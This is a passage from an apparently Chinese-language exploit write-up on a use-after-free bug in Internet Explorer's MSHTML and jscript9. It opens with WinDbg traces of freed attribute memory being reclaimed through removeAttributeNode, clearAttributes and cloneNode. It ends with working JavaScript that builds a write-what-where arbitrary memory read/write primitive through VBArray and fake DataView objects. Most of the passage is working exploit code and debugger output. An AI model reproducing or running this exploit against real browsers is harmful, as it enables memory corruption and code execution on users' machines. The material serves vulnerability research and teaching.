Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd1 = document.createAttribute('handle')
0:009&gt; p
eax=0a2f9d20 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009&gt; du 093b31e4 
093b31e4  "handle"
0:009&gt; g
Breakpoint 0 hit
eax=0e408092 ebx=00ebd201 ecx=72040490 edx=00040000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createElement (72040490)}	//var ele = document.createElement('element')
0:009&gt; p
eax=0a2f9d50 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L8	//ele
05382b40  715f5670 00000001 00000001 00000008
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009&gt; dd 05378a70 L4		//CAttrArray
05378a70  00000010 00000001 0541f580 00000000
0:009&gt; dd 0541f580 L1*4		//CAtrrValue
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0:009&gt; du poi(05384bc0+8)
093b2fc4  "element"
</code></pre></div></div>

<p>当执行到removeAttributeNode时，ele内已经存放了attribute回调函数和attr字符串数组：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e409f2c ebx=00ebd201 ecx=7204f960 edx=00001000 esi=10000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CElement::Trampoline_removeAttributeNode (7204f960)}	//ele.removeAttributeNode(att)
0:009&gt; dd 05382b40 L8
05382b40  715f5670 00000001 00000001 00000010
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009&gt; dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009&gt; dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc	//elemengt
0541f590  80000901 002dc6c1 09649b84 00000020	//attribute.nodeValue
0541f5a0  80000d09 002dc6c1 053872c0 05cec824	//attribute
0541f5b0  80000801 002dc6c2 0943b5b4 00000020	//attr
0:009&gt; du poi(053872c0+24) 
093b3284  "attribute"
0:009&gt; dd 0943b5b4-4	//attr
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
</code></pre></div></div>

<p>接着在执行removeAttributeNode时，会调用att的回调函数，执行函数alloc1()，将ArrayBuffer：abf复制到hd1.nodeValue：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec068 ebp=05cec0d0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec0b8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var result = document.createAttribute('alloc')
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cebfc0 ebp=05cec024 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec00c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//result.nodeValue = unescape(str)
0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec1d8 ebp=05cec23c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec224={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec27c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//hd1.nodeValue = (new alloc1()).nodeValue
0:009&gt; dd 05387260 L10	//hd1，此时hd1.nodeValue还未赋值
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec268=05cec240
0:009&gt; dd 05387260 L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  094a200c 00000000 05382370 00000000
0:009&gt; dd 094a200c-4	//abf已经复制到了hd1.nodeValue
094a2008  0002000a 00000000 00000000 00000000
094a2018  00000000 00000000 00000000 00000000
094a2028  00000000 00000000 00000000 00000000
094a2038  00000000 00000000 00000000 00000000
094a2048  00000000 00000000 00000000 00000000
094a2058  00000000 00000000 00000000 00000000
094a2068  00000000 00000000 00000000 00000000
094a2078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>执行完毕clearAttributes后，ele内的元素被清除，attr所占用的内存空间也会被清理，当执行完hd1.cloneNode()后，attr所占用的内存空间变成了hd1.nodeValue，此时获得了hd2.nodeValue这个0x20100大小的读写原语：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407d10 ebx=00ebd201 ecx=7203e880 edx=40010004 esi=10000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CHTMLElement::Trampoline_clearAttributes (7203e880)}	//ele.clearAttributes()
0:009&gt; dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009&gt; dd 0541f580 L4*4		//此时CAttr中的元素还未被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000901 002dc6c1 09649b84 00000020
0541f5a0  80000d09 002dc6c1 053872c0 05cec824
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//attr所在内存也未被清除
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=10000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009&gt; dd 0541f580 L4*4		//执行完毕后，CAttr中的元素被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//attr所在内存也被清理，为空闲状态
0943b5b0  09461fd8 093ff588 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009&gt; g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}	//hd2 = hd1.cloneNode()
0:009&gt; p
eax=0c565000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009&gt; dd 0943b5b4-4		//attr所占用的内存空间变成了hd1.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>然而如果直接返回到removeAttributeNode，当获取Index时就会发生报错，为了避免这种情况添加了attribute到ele中，这样就能成功获取到序号，执行CAttrArray::Destroy将attr所占用的内存空间释放：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e30d7e0 ebx=00ebd201 ecx=7186bf00 edx=00000001 esi=10000003 edi=00000003
eip=73869e6b esp=05cec2d0 ebp=05cec338 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec320={MSHTML!CFastDOM::CElement::Trampoline_setAttribute (7186bf00)}	//ele.setAttribute('attribute', 1337)
0:009&gt; dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}
0:009&gt; dd 0541f580 L4*4		//执行完毕整个removeAttributeNode函数后，ele内有两个元素，attr所占内存也被再次释放
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c1 0945bcbc 08d069d0
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//hd2.nodeValue
0943b5b0  09461fd8 093ff588 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>读写原语hd2.nodeValue构造完毕，接下来通过hd2.nodeValue构造write-what-where读写原语来实现利用。</p>

<h2 id="构造write-what-where">构造write-what-where</h2>

<p>构造write-what-where读写原语EXP：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">dump</span><span class="p">(</span><span class="nx">nv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x20010</span><span class="p">)</span>
    <span class="kd">var</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">ab</span><span class="p">)</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">nv</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
        <span class="nx">view</span><span class="p">.</span><span class="nx">setUint16</span><span class="p">(</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">nv</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">),</span> <span class="kc">true</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">ab</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="nx">type</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">setData</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">abf</span><span class="p">)</span>
    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">type</span>
    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">value</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">flush</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">hd1</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">alloc1</span><span class="p">()).</span><span class="nx">nodeValue</span>
    <span class="nx">hd2</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="nx">hd2</span> <span class="o">=</span> <span class="nx">hd1</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint8</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">16</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint16</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">32</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">16</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint16</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">32</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">writeData</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
        <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="mi">8</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span>
    <span class="k">return</span> <span class="nx">read</span><span class="p">(</span><span class="nx">pArr</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">leak</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">dump</span><span class="p">(</span><span class="nx">hd2</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">))</span>
<span class="kd">var</span> <span class="nx">pAbf</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>		<span class="c1">//fake</span>
<span class="kd">var</span> <span class="nx">pArr</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>		<span class="c1">//arr</span>
<span class="kd">var</span> <span class="nx">VT_I4</span> <span class="o">=</span> <span class="mh">0x3</span>
<span class="kd">var</span> <span class="nx">VT_DISPATCH</span> <span class="o">=</span> <span class="mh">0x9</span>
<span class="kd">var</span> <span class="nx">VT_BYREF</span> <span class="o">=</span> <span class="mh">0x4000</span>
<span class="kd">var</span> <span class="nx">bufArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">fakeArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">fake</span><span class="p">)</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">setData</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">pAbf</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">bufArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>	<span class="c1">//bufArr[0] = fake,bufArr[1] = arr</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]))</span>				<span class="c1">//fakeArray</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">))</span>		<span class="c1">//fakeArray+0x4</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_BYREF</span> <span class="o">|</span> <span class="nx">VT_I4</span><span class="p">,</span> <span class="nx">bufArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">))</span>		<span class="c1">//fakebuffer</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">vt</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">gc</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">bs</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="nx">fakeArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">bufArr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">bs</span> <span class="o">+</span> <span class="mh">0x40</span>			
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="nx">vt</span>
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="nx">gc</span>					
<span class="nx">fakeArr</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span>			<span class="c1">//buffersize</span>
<span class="nx">setData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">VT_DISPATCH</span><span class="p">,</span> <span class="nx">bs</span><span class="p">))</span>
<span class="nx">flush</span><span class="p">()</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VBArray</span><span class="p">(</span><span class="nx">hd0</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">)</span>	<span class="c1">//abf[0]</span>
<span class="nx">god</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">ref</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>	<span class="c1">//write-what-where读写原语</span>
<span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nx">pArr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">read</span><span class="p">(</span><span class="nx">pArr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span>
